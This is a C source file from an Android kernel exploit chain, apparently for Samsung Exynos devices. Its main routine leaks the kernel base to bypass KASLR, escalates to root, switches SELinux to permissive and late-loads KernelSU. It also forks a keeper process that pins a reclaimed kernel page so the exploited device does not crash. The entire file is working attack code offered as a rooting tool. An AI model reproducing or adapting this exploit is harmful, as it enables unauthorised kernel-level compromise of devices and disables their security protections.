#include "common.h"
#include "ksu_proto.h"

int log_fd;

#define BUILT_BY_STR "built by nothin 2026.09.05"

/*
 * Stability keeper (ported from IonStack-S22U/src/main.c).
 *
 * The reclaimed kernel page (fake task/lock/fops, UMH work + completion)
 * is owned by the reclaim socket/memfd descriptors. When the exploit
 * process calls _exit(), those descriptors close and the kernel frees the
 * page, leaving the parked walk residue and the queued work item dangling
 * (freeze/panic). Forking a keeper that inherits every open descriptor
 * keeps the page allocated for the session, so the exploit process can
 * exit cleanly — the "safe exit" the chain previously lacked.
 */
static pid_t spawn_allocation_keeper(void) {
  pid_t child = fork();
  if (child < 0) {
    pr_warning("stability keeper fork failed errno=%d\n", errno);
    return -1;
  }
  if (child != 0) {
    return child;
  }

  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
  syscall(SYS_prctl, PR_SET_NAME, "cve43499-hold", 0, 0, 0);
  syscall(SYS_setsid);

  /* Detach from the adb shell pipes so the parked keeper never keeps the
   * adb session open; reclaim descriptors (>= 3, except log_fd) stay open
   * and keep the reclaimed page alive. */
  int null_fd = (int)syscall(SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
  if (null_fd >= 0) {
    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
      if (null_fd != fd) {
        syscall(SYS_dup3, null_fd, fd, 0);
      }
    }
    if (null_fd > STDERR_FILENO) {
      syscall(SYS_close, null_fd);
    }
  } else {
    syscall(SYS_close, STDIN_FILENO);
    syscall(SYS_close, STDOUT_FILENO);
    syscall(SYS_close, STDERR_FILENO);
  }
  if (log_fd > STDERR_FILENO) {
    syscall(SYS_close, log_fd);
  }

  struct timespec hold = {
      .tv_sec = 86400,
      .tv_nsec = 0,
  };
  for (;;) {
    syscall(SYS_nanosleep, &hold, NULL);
  }
}

int run_exploit(int argc, char **argv) {
  log_fd = PSELECT_ROUTE_NFDS + 55;
  dup2(STDOUT_FILENO, log_fd);

  set_unbuffer();
  set_limit();
  log_startup_context();
  pr_success("target build: label=%s exynos=%d\n",
             BUILD_VARIANT_LABEL, BUILD_EXYNOS);

  if (!slide_leak_kernel_base()) {
    pr_warning("kaslr slide leak failed\n");
    return RC_FAIL;
  }

  if (!attr_run()) {
    return RC_CARRIER_FAIL;
  }

  int ok = install_android_root();
  pr_success("root chain complete: uid=%u->%u, selinux=%s->%s, daemon=%s\n",

             root_uid_before, root_uid_after, selinux_before ? "enforcing" : "permissive",
             selinux_after ? "enforcing" : "permissive", root_child_done ? "ready" : "not-ready");
  if (!ok) {
    attr_cleanup();
    return RC_CARRIER_FAIL;
  }

  if (spawn_allocation_keeper() < 0) {
    pr_warning("stability keeper unavailable; reclaimed page lifetime degraded\n");
  }

  if (getenv("KSU_SKIP")) {
    pr_success("no-ksu mode: skipping kernelsu late-load\n");
    pr_warning(
        "no-ksu session: enforcing stays permissive (socket root only; "
        "Knox risk, reboot to restore)\n");
    pr_success(
        "temporary root granted (no-ksu permissive), "
        "jailbreak complete!\n");
    pr_success(BUILT_BY_STR "\n");
    attr_cleanup();
    return RC_OK;
  }

  if (prepare_ksud_stage() != 0) {
    pr_warning("ksu stage prepare failed; proceeding — daemon will diagnose\n");
  }

  int ksu = -1;
  for (int r = 0; r < 3 && ksu != 0; r++) {
    if (r > 0) {
      pr_warning("ksu late-load retry %d/3 (last status=%d)\n", r, ksu);
      usleep(300000);
    }
    ksu = umh_request_ksu();
  }

  attr_cleanup();

  if (ksu == 0) {
    pr_success("kernelsu late-load succeeded\n");
    pr_success("temporary root privileges acquired\n");
    pr_success(BUILT_BY_STR "\n");
    return RC_OK;
  }
  pr_warning("kernelsu late-load failed: status=%d\n", ksu);
  pr_success("temporary root still active (socket root) — fix /data/local/tmp/ksud, "
             "then reboot and retry (or reuse the live root socket)\n");
  return RC_KSU_FAIL;
}
